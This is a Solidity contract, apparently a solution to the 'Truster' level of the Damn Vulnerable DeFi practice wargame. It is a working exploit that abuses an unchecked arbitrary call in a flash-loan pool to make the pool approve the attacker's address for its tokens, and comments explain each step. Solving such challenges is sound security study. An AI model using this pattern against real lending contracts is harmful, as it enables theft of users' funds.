// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import { TrusterLenderPool } from "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";


contract HackTruster  {
    TrusterLenderPool pool;
    DamnValuableToken public immutable token;

    constructor(address _pool, DamnValuableToken _token) {
        pool = TrusterLenderPool(_pool);
        token = _token;
    }

    function hack(uint256 amount) public {
        // Here are a couples of thing to notice:
        // First, we're passing 0 as the borrowedAmount so we don't need to return it
        // Because we don't need to return it, we can call another contract as the target
        // The flashLoan doesn't verify who is the target address
        // So we can pass the address of our DV Token and make a call for a function inside it
        // The function we're going to call is approve()
        // Because the function it's called by the LenderPool it's going to make an approve of it's own found
        // So, we're authorazing player to make use of the LenderPool funds
        // The last thing we need to do is to make a transferFrom called by the player
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", tx.origin, amount));
    }

}